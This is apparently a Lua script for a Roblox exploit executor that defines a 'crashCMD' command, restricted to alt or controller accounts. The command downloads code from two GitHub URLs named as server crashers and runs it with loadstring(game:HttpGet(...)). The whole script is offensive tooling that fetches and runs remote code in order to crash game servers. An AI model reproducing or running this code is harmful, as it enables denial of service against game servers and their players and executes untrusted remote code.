getgenv().ExecutedcrashCMD = true

getgenv().crashCMD = function()
    if game.Players.LocalPlayer.UserId == getgenv().alts['Alt1'] or game.Players.LocalPlayer.UserId == controller then
        if args[2] then
            if args[2]:lower() == 'swag' then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
            end
        else
            loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
        end
    end
end
